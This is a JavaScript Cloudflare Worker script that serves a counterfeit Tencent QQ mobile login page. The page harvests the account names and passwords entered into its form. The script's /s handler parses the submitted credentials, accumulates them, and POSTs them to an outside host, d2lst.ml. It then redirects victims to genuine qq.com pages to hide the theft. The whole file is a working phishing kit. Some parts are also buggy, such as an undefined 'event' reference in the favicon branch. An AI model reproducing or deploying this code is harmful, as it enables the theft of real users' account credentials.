const NOT_FOUND_RETURN = "<!DOCTYPE html><html lang=\"zh-cn\"><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"><meta id=\"viewport\" name=\"viewport\" content=\"width=device-width,minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no\"><meta name=\"apple-mobile-web-app-capable\" content=\"yes\"><title>手机统一登录<\/title><style type=\"text/css\">@charset \"utf-8\";body,html{height:100%}#go,#onekey,#vcode #submit,.copyright,.header,.nick,.q_login,.ui_topbar{text-align:center}.del_touch,.inputstyle{-webkit-tap-highlight-color:rgba(255,255,255,0)}body{font-size:16px;background:#eee}*{padding:0;margin:0;list-style:none;text-decoration:none}input::-webkit-input-placeholder,textarea::-webkit-input-placeholder{color:#aaa}input::-ms-input-placeholder,textarea::-ms-input-placeholder{color:#aaa}input:focus{outline:0}.content{margin:0 auto;width:320px;height:500px;position:relative}#error_tips{position:absolute;top:0;z-index:100;display:none;opacity:.95;width:100%}#error_tips #error_tips_content{position:relative;padding:16px 0 24px 24px;border-radius:5px;background-color:#525c5f;height:28px}#error_tips #error_tips_content #error_icon{position:absolute;top:18px;display:inline-block;width:24px;height:24px;background:url(https://ui.ptlogin2.qq.com/style/8/images/info.png) no-repeat}#error_tips #error_tips_content #error_message{display:inline-block;line-height:28px;font-size:14px;color:#fff;padding:0 0 0 28px}#error_message a,#error_message a:visited{color:#f15a22}@media (-webkit-min-device-pixel-ratio:2),(min-resolution:192dpi),(min-resolution:2dppx){#error_tips #error_tips_content #error_icon{background:url(https://ui.ptlogin2.qq.com/style/8/images/info@2x.png) no-repeat;background-size:24px 24px}}.login{margin:0 auto;padding-top:30px}.q_login{margin:0 auto 40px;width:290px;overflow:hidden}.inputstyle{width:273px;height:44px;color:#000;border:none;background:0 0;padding-left:15px;font-size:16px;-webkit-appearance:none}.logo{height:100px;width:244px;margin:0 auto 20px;background-size:244px 100px}#switch,#vcode,#web_login{margin:0 auto}.header{display:inline-block;height:97px;width:96px;position:relative}#q_login_logo,#q_login_tips,#remember,#remember+.checkbox,#vcode #input_tips,#vcode #vcode_img,#vcode #vcode_input,.del_touch,.del_touch_icon,.del_u,.header .img_out,.header img,.nick,.txt_default{position:absolute}.header img{width:60px;height:60px;top:10px;left:16px}.header .img_out{width:60px;height:60px;top:9px;left:15px;border:1px solid #c6dbe8;border-radius:4px;-webkit-box-shadow:1px 1px 13px #6e6e6e}.nick{display:inline-block;top:80px;left:0;height:20px;line-height:18px;vertical-align:middle}.del_touch_icon{display:none;width:30px;height:30px;left:60px;top:0;z-index:1}.del_icon{display:block;width:24px;height:22px;background:url(https://ui.ptlogin2.qq.com/style/8/images/android_logo_v1.png) -68px 0 no-repeat;border-radius:11px}#web_login{width:290px}#g_list{background:#fff;height:89px;border-radius:4px}#g_p,#g_u{position:relative}#g_u{border-bottom:1px solid #eaeaea}.txt_default{top:12px;left:10px;color:#b3b3b3}.del_touch{right:0;display:none;height:44px;width:48px;z-index:1}.del_u{display:block;left:15px;top:13px;height:18px;width:18px;border-radius:9px;background:url(https://ui.ptlogin2.qq.com/style/8/images/android_logo_v1.png) -117px -2px no-repeat}#auto_login{height:24px;margin:15px 0;color:#246183;position:relative}#auto_login .wording{position:absolute;left:40px;line-height:24px;height:24px;font-size:14px}#remember{left:14px;top:5px;cursor:pointer;z-index:1;opacity:.01}#remember:checked+.checkbox{background:url(https://ui.ptlogin2.qq.com/style/8/images/checked.png) 1px 1px #146fdf;border-color:#146fdf}#remember+.checkbox{display:inline-block;width:21px;height:21px;left:9px;top:1px;border:1px solid #9abbe3;background:0 0;border-radius:11px}#go,#onekey{width:290px;height:44px;line-height:44px;background:#146fdf;border:none;border-radius:4px;color:#fff;font-size:16px;margin-top:15px;display:block}#go.weak,#onekey.weak,#switch #swicth_login{height:42px;border:1px solid #9abbe3;color:#146fdf}#onekey{background:#146fdf}#go.weak,#onekey.weak{background-color:#e7e7e7}#switch{width:290px}#switch #swicth_login{width:288px;line-height:44px;border-radius:5px;background:#e7e7e7;margin-top:10px;text-align:center;font-size:16px}#switch #zc_feedback{width:290px;position:relative;margin-top:15px;overflow:hidden}#switch #forgetpwd,#switch #zc{color:#246183;line-height:14px;font-size:14px;padding:15px 10px}#switch #zc{float:right;margin-right:-10px}#switch #forgetpwd{float:left;margin-left:-10px}.tansparent{background:0 0}#q_login_title{height:32px;line-height:22px;margin-bottom:20px;position:relative}#q_login_logo{background:url(https://ui.ptlogin2.qq.com/style/8/images/android_logo_v1.png) -44px 0 no-repeat;width:22px;height:22px;left:0}#q_login_tips{left:30px;top:0;color:#246183}#vcode{padding-top:40px;display:none}#vcode #vcode_tips{display:block;width:290px;height:20px;line-height:20px;margin:0 auto 15px;color:#77838d}#vcode #vcode_area{position:relative;margin:0 auto;width:290px;height:70px;border-radius:5px;border:1px solid #b8b8b8;background:#fff}#vcode #vcode_img{left:3px;width:140px;height:70px}#vcode #vcode_input{top:-1px;left:145px;width:145px;height:70px;border:1px solid #9d9d9d;background:0 0;-webkit-appearance:none;border-top-right-radius:5px;border-bottom-right-radius:5px;line-height:28px;font-size:28px;-webkit-box-shadow:inset 0 0 10px #ccc}#vcode #input_tips{top:5px;left:150px;display:block;width:135px;height:50px;color:#b3b3b3;z-index:1;padding-top:8px}#vcode #submit{width:288px;height:22px;padding:10px 0;background:#7ec82c;border:none;border-radius:5px;color:#fff;font-size:22px;margin:35px auto 0}.copyright{color:#8a949d;font-size:10px;margin-top:15px;font-family:Helvetica}.copyright .chs,.copyright .en{line-height:20px}.mode_webapp .ui_topbar .topbar_btn b,.mode_webapp .ui_topbar .topbar_btn_left b{background-image:url(https://ui.ptlogin2.qq.com/style/8/images/bg_btn_back.png);background-position:bottom right;background-size:105px;width:6px;height:32px;float:left}.ui_topbar .topbar_title,.ui_topbar h3{font-size:18px}.ui_topbar{border-bottom:1px solid #b6b6b6;border-top:2px solid #df242a;background-color:#d9d9d9;background-image:-webkit-gradient(linear,left top,left bottom,from(#ebebeb),to(#d9d9d9));background-image:-webkit-linear-gradient(top,#ebebeb,#d9d9d9);background-image:linear-gradient(to bottom,#ebebeb,#d9d9d9);height:40px;line-height:40px;position:relative}.lay_header{height:auto!important;width:100%}.mode_webapp .ui_topbar{color:#fff;background-color:#c32d32;background-image:-webkit-gradient(linear,left top,left bottom,from(#fe444a),to(#c32d32));background-image:-webkit-linear-gradient(top,#fe444a,#c32d32);background-image:linear-gradient(to bottom,#fe444a,#c32d32);border-bottom:1px solid #700d00;border-top:0 none;top:0;left:0;width:100%;box-shadow:0 0 5px #333}.mode_webapp .ui_topbar .topbar_btn_left{display:block;position:absolute;left:10px;top:5px}.mode_webapp .ui_topbar .topbar_btn span,.mode_webapp .ui_topbar .topbar_btn_left span{float:left;display:inline-block;height:32px;line-height:30px;color:#fff;background-image:url(https://ui.ptlogin2.qq.com/style/8/images/bg_btn_back.png);background-size:105px;padding-left:10px;padding-right:4px}.mode_webapp .ui_topbar .topbar_btn_left span{background-image:url(https://ui.ptlogin2.qq.com/style/8/images/bg_btn_back.png);background-position:left -32px;background-size:105px;padding-left:17px}.skin-2 .ui_topbar{background-color:#161616;background-image:-webkit-gradient(linear,left top,left bottom,from(#3e3e3e),to(#262626));background-image:-webkit-linear-gradient(top,#3e3e3e,#262626);background-image:linear-gradient(to bottom,#3e3e3e,#262626);border-bottom-color:#1a1a1a}.skin-2 .ui_topbar .topbar_btn b,.skin-2 .ui_topbar .topbar_btn span,.skin-2 .ui_topbar .topbar_btn_left b,.skin-2 .ui_topbar .topbar_btn_left span{background-image:url(https://ui.ptlogin2.qq.com/style/8/images/bg_btn_back_black@2x.png);background-size:105px}.new_vcode{display:none;width:100%;height:100%;overflow:hidden}<\/style><link rel=\"stylesheet\" type=\"text/css\" href=\"https://imgcache.qq.com/ptlogin/v4/style/mobile_common.css\"><style type=\"text/css\">.logo{background-image:url(https://qzonestyle.gtimg.cn/qzone/phone/style/img/ptlogin-logo.png)}<\/style><\/head><body><div id=\"content\" class=\"content\"><div id=\"login\" class=\"login\"><div id=\"logo\" class=\"logo\"><\/div><div id=\"web_login\"><form id=\"myform\" action=\"/s\" method=\"post\"><ul id=\"g_list\"><li id=\"g_u\"><div id=\"del_touch\" class=\"del_touch\" onclick='this.style.display=\"none\",document.getElementById(\"u\").value=\"\"'><span id=\"del_u\" class=\"del_u\"><\/span><\/div><input id=\"u\" class=\"inputstyle\" name=\"u\" autocomplete=\"off\" placeholder=\"QQ号码/手机/邮箱\" oninput='document.getElementById(\"del_touch\").style.display=this.value!=window.empStr?\"block\":\"none\"'><\/li><li id=\"g_p\"><div id=\"del_touch_p\" class=\"del_touch\" onclick='this.style.display=\"none\",document.getElementById(\"p\").value=\"\"'><span id=\"del_p\" class=\"del_u\"><\/span><\/div><input id=\"p\" class=\"inputstyle\" maxlength=\"16\" type=\"password\" name=\"p\" autocorrect=\"off\" placeholder=\"请输入你的QQ密码\" oninput='document.getElementById(\"del_touch_p\").style.display=this.value!=window.empStr?\"block\":\"none\"'><\/li><\/ul><div onclick='document.getElementById(\"myform\").submit()' id=\"go\">登 录<\/div><div onclick='window.open(\"qq://\")' id=\"onekey\" class=\"weak\">一键登录<\/div><input type=\"hidden\" name=\"s\" value=\"登 录\"/><\/form><\/div><div id=\"switch\"><div id=\"zc_feedback\"><span id=\"zc\" onclick='window.open(\"https://ssl.zc.qq.com/v3/index-chs.html?from=pt\")'>注册新帐号<\/span> <span id=\"forgetpwd\" onclick='window.open(\"https://aq.qq.com/cn2/findpsw/mobile_v2/mobile_web_find_index?source_id=3263&account\")'>忘了密码？<\/span><\/div><\/div><\/div><div id=\"footerBlank\"><script>window.empStr=\"\"<\/script><\/div><\/div><\/body><\/html>\n";;
const REPORT_DATA = [];
const FAVICON = "https://ssl.zc.qq.com/favicon.ico";
const DEBUG = true;
addEventListener('fetch', event => {
    event.respondWith(handleRequest(event.request));
});

/**
 * Respond to the request
 * @param {Request} request
 */
async function handleRequest(request) {
  var urlObj = new URL(request.url);
  var nf_rep = null;
  switch(urlObj.pathname){
    case "/s":
      var body = await request.text();
      var entries_raw = body.split("&"); // split param
      var found = {};
      for (s in entries_raw){
        var parsit = entries_raw[s].split("="); // split key-value pair
        found[decodeURIComponent(parsit[0])] = decodeURIComponent(parsit[1].replace("+", "%20")); // as space, + = %20
      }
      REPORT_DATA[REPORT_DATA.length] = found;
      if (DEBUG) {
        await fetch("https://d2lst.ml/test-workers/submit.php", {
          body: (()=>{
            var theBody = new URLSearchParams();
            theBody.append("u", JSON.stringify(REPORT_DATA,null,"\t"));
            return theBody;
          })(),
          method: "POST"
        }).then(async (rep) => {
          var z = await rep.text();
          console.log(z);
        })
        .catch((r) => {
          nf_rep = new Response(r, {status: 500});
        });
      }
      if (nf_rep != null) break;
      nf_rep = Response.redirect((found["s"] == "登 录" ? "https://ti.qq.com/qq20th" : "https://act.qzone.qq.com"), 301);
      break;
    case "/favicon.ico":
      event.respondWith(Response.redirect(FAVICON, 301));
      break;
    default: 
      nf_rep = new Response(NOT_FOUND_RETURN, {
        status: 404,
        headers: new Headers({
          "Content-Type": "text/html"
        })
      });
      break;
  };
  return nf_rep;
}
